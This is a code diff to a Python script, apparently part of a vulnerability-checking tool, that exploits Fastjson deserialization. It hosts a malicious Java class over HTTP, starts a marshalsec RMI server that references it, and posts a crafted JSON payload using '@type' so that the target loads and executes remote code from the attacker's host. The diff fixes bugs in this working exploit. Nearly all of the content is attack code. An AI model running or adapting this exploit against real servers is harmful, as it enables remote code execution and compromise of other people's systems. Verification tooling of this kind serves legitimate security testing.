@@ -33,16 +33,19 @@ def get_info():
 
 
 def verify(ip, port, cmd="uname"):
-    # 切换到文件目录
+    # 切换到.class文件所在目录
     web_dir = os.path.join(os.path.dirname(__file__), "../data/fastjson")
     os.chdir(web_dir)
     # 开启一个文件服务器
     handler = http.server.SimpleHTTPRequestHandler
-    httpd = socketserver.TCPServer(("0.0.0.0.", LPORT), handler)
+    httpd = socketserver.TCPServer(("0.0.0.0", LPORT), handler)
     Thread(target=httpd.serve_forever, daemon=True).start()
     # 借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class
     rmi = subprocess.Popen(
-        f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://{LHOST}:{LPORT}/#TouchFile" 9999')
+        f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://{LHOST}:{LPORT}/#TouchFile 9999'.split(),
+        cwd=os.getcwd(),
+        shell=False,
+        )
     data = {
         "a": {
             "@type": "java.lang.Class",
@@ -55,11 +58,8 @@ def verify(ip, port, cmd="uname"):
         }
     }
     headers = {'Content-Type': 'application/json'}
-    requests.post(f"http://{ip}:{port}/",
-                  data=json.dumps(data), headers=headers)
+    requests.post(f"http://{ip}:{port}/", data=json.dumps(data), headers=headers)
     from time import sleep
-    sleep(5)
+    sleep(3)
     rmi.kill()
-    httpd.shutdown()
-
-verify("", 8090)
+    httpd.server_close()
